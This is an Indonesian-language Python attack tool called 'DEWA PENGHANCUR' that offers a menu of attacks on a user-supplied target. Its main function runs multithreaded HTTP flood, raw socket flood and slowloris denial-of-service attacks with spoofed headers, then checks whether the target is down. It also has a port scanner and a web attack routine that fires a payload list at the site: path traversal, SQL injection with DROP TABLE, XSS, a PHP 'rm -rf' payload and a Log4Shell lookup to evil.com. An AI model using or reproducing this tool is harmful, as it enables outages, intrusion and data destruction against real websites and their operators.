import os
import sys
import time
import random
import requests
import threading
import socket
import ssl
import hashlib
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
import urllib3

# 🔥 OPTIMISASI IMPORT COLORAMA
try:
    from colorama import init, Fore
    init(autoreset=True)
    COLORS = {
        'CYAN': Fore.CYAN,
        'GREEN': Fore.GREEN, 
        'RED': Fore.RED,
        'YELLOW': Fore.YELLOW,
        'WHITE': Fore.WHITE,
        'BLUE': Fore.BLUE,
        'MAGENTA': Fore.MAGENTA
    }
except ImportError:
    COLORS = {color: "" for color in ['CYAN', 'GREEN', 'RED', 'YELLOW', 'WHITE', 'BLUE', 'MAGENTA']}

# 🔒 DISABLE WARNING
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 🎯 USER AGENT SUPER FAST
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
]

# 🎯 TARGET PATHS EXTENDED
destroy_paths = [
    '/', '/index.php', '/admin', '/login', '/wp-admin', '/wp-login.php',
    '/api', '/.env', '/config.php', '/wp-config.php', '/phpmyadmin',
    '/administrator', '/mysql', '/db', '/database', '/backup',
    '/test', '/debug', '/cpanel', '/webmail', '/ftp'
]

# 💀 PAYLOAD DESTRUCTION MASSIVE
destruction_payloads = [
    "../../../../etc/passwd",
    "../../../../windows/win.ini", 
    "..././..././..././..././etc/passwd",
    "<script>alert('DESTROYED')</script>",
    "' OR '1'='1' --",
    "' UNION SELECT 1,2,3,4,5 --",
    "<?php system('rm -rf /*'); ?>",
    "${jndi:ldap://evil.com/x}",
    "|| ping -c 100 127.0.0.1",
    "'; DROP TABLE users; --",
    "../" * 20 + "etc/passwd",
    "....//....//....//etc/passwd"
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_fingerprint():
    unique_id = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:8]
    return f"ATK-{unique_id}"

def show_god_banner():
    clear_screen()
    print(f"{COLORS['RED']}╔══════════════════════════════════════════════════════════════╗")
    print(f"{COLORS['RED']}║  {COLORS['CYAN']}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  {COLORS['RED']}║")
    print(f"{COLORS['RED']}║  {COLORS['CYAN']}▓▓▓▄ ▓▓▓▓ ▓▓▓▄ ▓▓▓▓▓ ▓▓▓▄ ▓▓▓▓▄▄ ▓▓▓▓▓▓ ▓▓▓▄ ▓▓▓▓▄▄ ▓▓▓▓▓▓  {COLORS['RED']}║")
    print(f"{COLORS['RED']}║  {COLORS['CYAN']}▓▓▓▓ ▓▓▓▓ ▓▓▓▓  ▓▓▓  ▓▓▓▓ ▓▓▓▓▓▓ ▓▓▓▓▓▓ ▓▓▓▓ ▓▓▓▓▓▓ ▓▓▓▓▓▓  {COLORS['RED']}║")
    print(f"{COLORS['RED']}║  {COLORS['CYAN']}▓▓▓▓ ▓▓▓▓ ▓▓▓▓  ▓▓▓  ▓▓▓▓ ▓▓▓▓▓▓ ▓▓▓▓▓▓ ▓▓▓▓ ▓▓▓▓▓▓ ▓▓▓▓▓▓  {COLORS['RED']}║")
    print(f"{COLORS['RED']}║  {COLORS['CYAN']}▓▓▓▓▀▀▀▀▀ ▓▓▓▓  ▓▓▓  ▓▓▓▓▀ ▓▓▓▓▀▀ ▓▓▓▓▀▀ ▓▓▓▓▀ ▓▓▓▓▀▀ ▓▓▓▓▀▀  {COLORS['RED']}║")
    print(f"{COLORS['RED']}║  {COLORS['CYAN']}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  {COLORS['RED']}║")
    print(f"{COLORS['RED']}╚══════════════════════════════════════════════════════════════╝")
    print(f"{COLORS['BLUE']}               ⚡ DEWA PENGHANCUR MAXIMUM ⚡")
    print(f"{COLORS['RED']}═════════════════════════════════════════════════════════════════")
    print(f"{COLORS['CYAN']}[+] Status: {COLORS['GREEN']}MAXIMUM DESTRUCTION MODE{COLORS['CYAN']}")
    print(f"{COLORS['RED']}═════════════════════════════════════════════════════════════════")

# 🚀 SERANGAN MAXIMUM POWER
def dewa_destruction():
    show_god_banner()
    print(f"{COLORS['RED']}[1] MODE DEWA - PENGHANCURAN MAXIMUM")
    print(f"{COLORS['BLUE']}═════════════════════════════════════════════════════════════════")
    
    target = input(f"{COLORS['CYAN']}[?] Masukkan target URL: {COLORS['WHITE']}")
    threads = int(input(f"{COLORS['CYAN']}[?] Jumlah threads (500-2000): {COLORS['WHITE']}") or 1000)
    duration = int(input(f"{COLORS['CYAN']}[?] Durasi serangan (detik): {COLORS['WHITE']}") or 120)
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    print(f"{COLORS['GREEN']}[+] Target: {target}")
    print(f"{COLORS['GREEN']}[+] Threads: {threads}")
    print(f"{COLORS['GREEN']}[+] Durasi: {duration} detik")
    
    attack_id = generate_fingerprint()
    print(f"{COLORS['CYAN']}[+] Attack ID: {attack_id}")
    
    parsed = urlparse(target)
    domain = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    
    print(f"\n{COLORS['RED']}[!] MENGAKTIFKAN SENJATA PEMUSNAH MAXIMUM...")
    
    attack_stats = {
        'success': 0, 
        'failed': 0,
        'start_time': time.time(),
        'attack_id': attack_id
    }
    lock = threading.Lock()
    end_time = time.time() + duration

    # 💥 HTTP FLOOD ULTRA FAST
    def http_flood(thread_id):
        session = requests.Session()
        session.verify = False
        
        while time.time() < end_time:
            try:
                # Multiple requests per iteration
                for _ in range(5):  # 5 requests per loop
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'Accept': '*/*',
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive',
                        'X-Attack-ID': attack_id
                    }
                    
                    # Multiple attack vectors
                    attack_url = target + random.choice(destroy_paths)
                    
                    # Random attack methods
                    attack_type = random.randint(1, 5)
                    
                    if attack_type == 1:  # GET Flood
                        session.get(attack_url, headers=headers, timeout=1, verify=False)
                    elif attack_type == 2:  # POST Flood
                        data = {'payload': random.choice(destruction_payloads)}
                        session.post(attack_url, headers=headers, data=data, timeout=1, verify=False)
                    elif attack_type == 3:  # HEAD Flood
                        session.head(attack_url, headers=headers, timeout=1, verify=False)
                    else:  # OPTIONS Flood
                        session.options(attack_url, headers=headers, timeout=1, verify=False)
                    
                    with lock:
                        attack_stats['success'] += 1
                        
            except Exception as e:
                with lock:
                    attack_stats['failed'] += 1

    # 🔥 SOCKET DESTRUCTION MASSIVE
    def socket_destruction(thread_id):
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                
                if port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=domain)
                
                s.connect((domain, port))
                
                # Send multiple malicious requests
                for _ in range(10):  # 10 requests per connection
                    payload = f"GET {random.choice(destroy_paths)}?{random.choice(destruction_payloads)} HTTP/1.1\r\n"
                    payload += f"Host: {domain}\r\n"
                    payload += f"User-Agent: {random.choice(user_agents)}\r\n"
                    payload += "Connection: keep-alive\r\n\r\n"
                    
                    s.send(payload.encode())
                    # Send garbage data
                    s.send(random._urandom(1024))
                
                s.close()
                with lock:
                    attack_stats['success'] += 1
                    
            except:
                with lock:
                    attack_stats['failed'] += 1

    # 💀 SLOWLORIS ATTACK
    def slowloris_attack(thread_id):
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((domain, port))
                
                # Send partial request to keep connection open
                partial = f"GET /{random.randint(100000,999999)} HTTP/1.1\r\n"
                partial += f"Host: {domain}\r\n"
                partial += "User-Agent: {random.choice(user_agents)}\r\n"
                partial += "Content-Length: 1000000\r\n"
                
                s.send(partial.encode())
                
                # Keep connection open with partial data
                start_slow = time.time()
                while time.time() - start_slow < 30 and time.time() < end_time:
                    s.send(b"X-a: b\r\n")
                    time.sleep(5)  # Send header every 5 seconds
                
                s.close()
                with lock:
                    attack_stats['success'] += 1
                    
            except:
                with lock:
                    attack_stats['failed'] += 1

    print(f"{COLORS['GREEN']}[+] Menjalankan {threads} THREADS PENGHANCURAN...")
    
    # Start all attack methods
    attack_threads = []
    for i in range(threads):
        if i % 3 == 0:
            t = threading.Thread(target=http_flood, args=(i,))
        elif i % 3 == 1:
            t = threading.Thread(target=socket_destruction, args=(i,))
        else:
            t = threading.Thread(target=slowloris_attack, args=(i,))
        
        t.daemon = True
        t.start()
        attack_threads.append(t)

    # Real-time monitoring
    last_count = 0
    print(f"\n{COLORS['CYAN']}[+] MEMULAI SERANGAN MAXIMUM...")
    print(f"{COLORS['RED']}═════════════════════════════════════════════════════════════════")
    
    while time.time() < end_time:
        elapsed = time.time() - attack_stats['start_time']
        success = attack_stats['success']
        failed = attack_stats['failed']
        total = success + failed
        
        rps = (success - last_count) if last_count > 0 else success
        last_count = success
        
        progress = min(100, (elapsed / duration) * 100)
        progress_bar = "█" * int(progress / 2) + "░" * (50 - int(progress / 2))
        
        print(f"\r{COLORS['CYAN']}[{progress_bar}] {progress:.1f}% | Time: {elapsed:.1f}s | RPS: {rps}/s | Success: {success} | Failed: {failed}", end="")
        time.sleep(0.1)

    print(f"\n\n{COLORS['GREEN']}[✓] PENGHANCURAN MAXIMUM SELESAI!")
    print(f"{COLORS['RED']}[!] SERANGAN DENGAN ID: {attack_id} TELAH BERAKHIR!")
    print(f"{COLORS['CYAN']}[+] Statistik Serangan:")
    print(f"{COLORS['CYAN']}    • Request Berhasil: {attack_stats['success']:,}")
    print(f"{COLORS['CYAN']}    • Request Gagal: {attack_stats['failed']:,}")
    print(f"{COLORS['CYAN']}    • Total Requests: {attack_stats['success'] + attack_stats['failed']:,}")
    print(f"{COLORS['CYAN']}    • Rata-rata RPS: {attack_stats['success'] / duration:,.0f}/detik")
    
    # Verify target status
    print(f"\n{COLORS['YELLOW']}[+] Memverifikasi status target...")
    try:
        start_time = time.time()
        response = requests.get(target, timeout=10, verify=False)
        response_time = time.time() - start_time
        
        if response.status_code != 200:
            print(f"{COLORS['GREEN']}[✓] Target DOWN! Status: {response.status_code}")
        elif response_time > 10:
            print(f"{COLORS['GREEN']}[✓] Target SLOW! Response time: {response_time:.2f}s")
        else:
            print(f"{COLORS['YELLOW']}[!] Target masih hidup tapi mungkin rusak parah")
    except requests.exceptions.Timeout:
        print(f"{COLORS['GREEN']}[✓] Target TIMEOUT - PENGHANCURAN BERHASIL!")
    except Exception as e:
        print(f"{COLORS['GREEN']}[✓] Target TIDAK DAPAT DIAKSES! Error: {str(e)}")
    
    input(f"\n{COLORS['CYAN']}[+] Tekan Enter untuk kembali...")

# 🎯 PORT SCANNER SUPER FAST
def port_destruction():
    show_god_banner()
    print(f"{COLORS['RED']}[2] PORT DESTRUCTION SCANNER")
    print(f"{COLORS['BLUE']}═════════════════════════════════════════════════════════════════")
    
    target = input(f"{COLORS['CYAN']}[?] Masukkan target IP/Domain: {COLORS['WHITE']}")
    
    try:
        target_ip = socket.gethostbyname(target)
        print(f"{COLORS['GREEN']}[+] Target IP: {target_ip}")
    except Exception as e:
        print(f"{COLORS['RED']}[!] Gagal resolve domain: {str(e)}")
        input(f"{COLORS['CYAN']}[+] Tekan Enter untuk kembali...")
        return
    
    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target_ip, port))
            sock.close()
            return port, result == 0
        except:
            return port, False
    
    # Extended port list
    common_ports = list(range(1, 100)) + [443, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080, 8443, 9090, 10000]
    open_ports = []
    
    print(f"{COLORS['CYAN']}[+] Scanning {len(common_ports)} ports...")
    
    with ThreadPoolExecutor(max_workers=200) as executor:
        results = executor.map(scan_port, common_ports)
    
    for port, is_open in results:
        if is_open:
            open_ports.append(port)
            print(f"{COLORS['GREEN']}[✓] Port {port} TERBUKA")
    
    print(f"\n{COLORS['CYAN']}[+] Scan selesai! Port terbuka: {open_ports}")
    input(f"{COLORS['CYAN']}[+] Tekan Enter untuk kembali...")

# 💀 WEB EXPLOIT DEEP SCAN
def web_destruction():
    show_god_banner()
    print(f"{COLORS['RED']}[3] WEB DESTRUCTION EXPLOIT")
    print(f"{COLORS['BLUE']}═════════════════════════════════════════════════════════════════")
    
    url = input(f"{COLORS['CYAN']}[?] Masukkan URL target: {COLORS['WHITE']}")
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    vulnerabilities = []
    
    print(f"{COLORS['CYAN']}[+] Memulai deep vulnerability scan...")
    
    # Test all payloads
    for payload in destruction_payloads:
        try:
            test_url = f"{url}/{payload}"
            response = requests.get(test_url, timeout=2, verify=False)
            
            vulnerability_indicators = [
                'root:', 'etc/passwd', 'Database', 'config', 'mysql',
                'warning', 'error', 'undefined', 'sql', 'syntax'
            ]
            
            if any(indicator in response.text for indicator in vulnerability_indicators):
                vulnerabilities.append(f"VULN: {payload}")
                print(f"{COLORS['RED']}[!] KERENTANAN DITEMUKAN: {payload}")
        except:
            pass
    
    print(f"\n{COLORS['CYAN']}[+] Deep scan selesai! {len(vulnerabilities)} kerentanan ditemukan!")
    
    if vulnerabilities:
        print(f"{COLORS['RED']}[!] DAFTAR KERENTANAN:")
        for vuln in vulnerabilities:
            print(f"    • {vuln}")
    
    input(f"{COLORS['CYAN']}[+] Tekan Enter untuk kembali...")

# 🚀 MAIN MENU
def dewa_main_menu():
    while True:
        show_god_banner()
        print(f"{COLORS['CYAN']}PILIH SENJATA DEWA:")
        print(f"{COLORS['BLUE']}═════════════════════════════════════════════════════════════════")
        print(f"{COLORS['RED']}[1] {COLORS['WHITE']}DEWA DESTRUCTION - Penghancuran Maximum")
        print(f"{COLORS['RED']}[2] {COLORS['WHITE']}Port Destruction - Scan Port Super Cepat")
        print(f"{COLORS['RED']}[3] {COLORS['WHITE']}Web Destruction - Deep Exploit Scan")
        print(f"{COLORS['RED']}[0] {COLORS['WHITE']}KELUAR")
        print(f"{COLORS['BLUE']}═════════════════════════════════════════════════════════════════")
        
        choice = input(f"{COLORS['CYAN']}[?] Pilih senjata (0-3): {COLORS['WHITE']}")
        
        if choice == '1':
            dewa_destruction()
        elif choice == '2':
            port_destruction()
        elif choice == '3':
            web_destruction()
        elif choice == '0':
            print(f"\n{COLORS['RED']}[!] Keluar dari Mode Dewa...")
            break
        else:
            print(f"{COLORS['RED']}[!] Pilihan tidak valid!")

if __name__ == "__main__":
    try:
        dewa_main_menu()
    except KeyboardInterrupt:
        print(f"\n{COLORS['RED']}[!] Dihentikan oleh user!")
    except Exception as e:
        print(f"\n{COLORS['RED']}[!] Error: {str(e)}")
